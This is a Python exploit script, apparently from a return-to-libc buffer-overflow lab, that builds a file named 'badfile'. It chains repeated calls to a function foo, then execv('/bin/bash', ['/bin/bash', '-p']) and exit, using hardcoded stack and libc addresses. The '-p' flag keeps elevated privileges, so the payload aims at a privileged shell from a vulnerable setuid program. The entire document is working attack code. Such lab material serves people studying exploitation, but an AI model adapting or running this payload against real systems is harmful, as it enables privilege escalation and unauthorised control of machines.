#!/usr/bin/env python3
import sys

BUFFER_FLAG = False

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

buf_addr = 0xffffd4b0 if BUFFER_FLAG else 0xffffd4f0
frame_addr = 0xffffd4c8 if BUFFER_FLAG else 0xffffd508
input_addr = 0xffffd4e8 if BUFFER_FLAG else 0xffffd528
buf_frame_dist = frame_addr - buf_addr

X =  buf_frame_dist
foo_addr = 0x565562d0
for _ in range(10):
    X += 4
    content[X:X+4] = (foo_addr).to_bytes(4,byteorder='little')

Y =  X + 4
execv_addr = 0xf7e91410
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = X + 8
exit_addr = 0xf7dfcec0 # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# pathname = address of "/bin/bash" 
M = X + 12
sh_addr = 0xffffdd4b if BUFFER_FLAG else 0xffffdfc2 # The address of "/bin/bash"
content[M:M+4] = (sh_addr).to_bytes(4,byteorder='little')

K = 150
content[K:K+4] = (sh_addr).to_bytes(4,byteorder='little') # argv[0]: /bin/bash
p_addr = 0xffffdfc8 if BUFFER_FLAG else 0xffffdfd0
content[K+4:K+8] = (p_addr).to_bytes(4,byteorder='little') # argv[1]: -p
null_addr = 0x0
content[K+8:K+12] = (null_addr).to_bytes(4,byteorder='little') # argv[2]: NULL
# content[K+8:K+12] = b'\x00\x00\x00\x00'

# argv = address of the payload
payload_addr = input_addr + 0x96
content[M+4:M+8] = (payload_addr).to_bytes(4,byteorder='little')

print(f"it would have execv() on loc {Y}, arguments from loc {M} to loc {M+8}, and exit on loc {Z}, meanwhile payload at {K}")

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
